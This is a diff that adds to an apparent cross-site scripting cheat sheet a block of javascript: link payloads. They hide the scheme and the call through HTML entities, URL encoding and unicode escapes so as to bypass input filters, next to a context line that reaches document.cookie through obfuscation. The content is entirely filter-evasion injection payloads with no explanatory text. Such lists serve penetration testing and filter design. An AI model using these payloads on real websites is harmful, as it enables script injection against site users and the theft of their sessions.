@@ -32,6 +32,35 @@ doc\u0075ment['cookie']
 window["doc"+"ument"]["cookie"]
 ```
 
+Href
+```
+<!--javascript -->
+ja&Tab;vascript:alert(1)
+ja&NewLine;vascript:alert(1)
+ja&#x0000A;vascript:alert(1)
+java&#x73;cript:alert()
+
+<!--::colon:: -->
+javascript&colon;alert()
+javascript&#x0003A;alert()
+javascript&#58;alert(1)
+javascript&#x3A;alert()
+
+<!-- alert -->
+#HTML entities/encode:
+javascript:alert&lpar;&rpar;
+javascript:al&#x65;rt``
+
+#url encoding:
+javascript:alert%60%60
+javascript:x='%27-alert(1)-%27';
+javascript:%61%6c%65%72%74%28%29
+
+#JS unicode 
+javascript:a\u006Cert``"
+javascript:\u0061\u006C\u0065\u0072\u0074``
+```
+
 ### Alert
 ```
 alert(1)
